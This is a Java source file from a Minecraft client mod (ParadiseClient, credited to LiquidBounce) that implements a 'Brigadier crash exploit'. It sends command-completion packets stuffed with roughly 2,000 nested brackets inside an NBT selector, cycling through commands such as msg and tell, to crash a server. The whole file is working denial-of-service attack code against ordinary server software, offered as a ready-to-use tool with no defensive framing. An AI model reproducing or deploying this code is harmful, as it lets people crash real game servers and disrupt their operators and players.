package io.github.spigotrce.paradiseclientfabric.exploit.impl;

import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import io.github.spigotrce.paradiseclientfabric.Constants;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

// Credits to https://liquidbounce.net/ as it's taken from LiquidBounce
// https://github.com/CCBlueX/LiquidBounce/blob/nextgen/src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/CompletionExploit.kt

public class BrigadierExploit extends Exploit {
    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";
    private final String[] knownWorkingMessages =
            {
                    "msg",
                    "minecraft:msg",
                    "tell",
                    "minecraft:tell",
                    "tm",
                    "teammsg",
                    "minecraft:teammsg",
                    "minecraft:w",
                    "minecraft:me"
            };

    private int messageIndex = 0;

    public BrigadierExploit() {
        super("tab", "Brigadier crash exploit");
    }

    @Override
    public void execute() {
        try {
            new Thread(() ->
            {

                if (messageIndex == knownWorkingMessages.length) {
                    messageIndex = 0;
                    return;
                }

                try {
                    Thread.sleep(20);
                } catch (InterruptedException e) {
                    Constants.LOGGER.error("[CrashExploit] [Brigadier/Tab] Error while waiting for 1 tick", e);
                    Helper.printChatMessage("[CrashExploit] [Brigadier/Tab] Error while waiting for 1 tick " + e.getMessage());
                }

                String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
                int len = 2044 - knownMessage.length();
                String overflow = generateJsonObject(len);
                String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

                int packets = 3;
                for (int i = 0; i < packets; i++) {
                    Helper.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                    Helper.printChatMessage("[CrashExploit] [Brigadier/Tab] tab_completion " + i);
                }
                messageIndex++;
            }).start();
        } catch (Exception e) {
            Helper.printChatMessage("Error while starting thread");
            Constants.LOGGER.error("Error while starting thread", e);
        }
    }

    private String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());

        json = "{a:" + json + "}";
        return json;
    }
}
